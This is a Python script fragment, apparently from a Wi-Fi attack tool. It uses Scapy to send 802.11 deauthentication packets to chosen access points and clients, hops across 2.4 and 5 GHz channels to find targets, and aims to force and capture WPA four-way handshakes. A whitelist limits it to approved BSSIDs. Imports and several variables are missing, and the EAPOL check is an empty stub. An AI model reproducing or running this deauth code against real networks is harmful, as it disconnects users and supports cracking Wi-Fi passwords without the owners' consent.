#!/usr/bin/env python

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


# Deauth is the Python implementation of sending deauth packets with Scapy
def Deauth(bssid):
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		# Test and make sure the deauth is coming from the correct interface
		sendp(packet,iface=attack_iface)
		print(('Deauth sent via: ' + attack_iface + ' to BSSID: ' + bssid + ' for Client: ' + client))
		# Need to add EAPOL checks here to make sure we catch all of the 4 way handshake before continuing. 
	time.sleep(15)

# Make sure the Listener recieved all of the EAPOL packets. 
def ConfirmEAPOL():
	print("")

# HoppinIface - Hop the primary Interface to find more beacons.  Much like airodump-ng channel hop
def HoppinIface(iface):
	channels = []
	# Get information for iface from Pyric
	w0 = pyw.getcard(iface)
	pinfo = pyw.phyinfo(w0)

	# I need to figure out how to get into a list the full availability of channels
	# for d in pinfo['bands']:
	# 	HT,VHT = pinfo['bands'][d]['HT'],pinfo['bands'][d]['VHT']
	# 	#print "Band: %s HT/VHT: %s/%s" % (d,HT,VHT)
	# 	if HT:
	# 		print pinfo['bands'][d]['rates']
	# 	if VHT:
	# 		print pinfo['bands'][d]['rates']

	channels = ["01","02","03","04","05","06","07","08","09","10","11","12","13","14","36","40","44","48","52","56","60","64","100","104","108","112","116","120","124","128","132","136"]
	# loop for the entire channel set
	for channel in itertools.cycle(channels):
		SetIfaceChannel(w0,channel)
		time.sleep(3) # Time to sleep per channel

# Main attacking function.
def GetAngry(data):
	(bssid,attack_channel) = data
	if bssid not in attack_list:
		print(("Attacking BSSID: %s on Channel %s" % (bssid, attack_channel)))

		iface = pyw.getcard(attack_iface)

		#Change the card and verify channel change. 
		SetIfaceChannel(iface,attack_channel)

		Deauth(bssid)
		
		# Add the attacked bssid to the attack_list to make sure we are not repeating addresses. 
		attack_list.append(bssid)

	elif bssid in attack_list:
		print(("Already Attacked BSSID: %s" % bssid))
	else:
		print("Something went wrong")

# PlayNice will check to make sure the BSSID is on the whitelist.
def PlayNice(bssid,channel):
	if bssid in whitelist:
		print("Approved SSID... Attack!")
		attack_queue.put((bssid,channel))
	else:
		print("Avoiding FCC Violations.")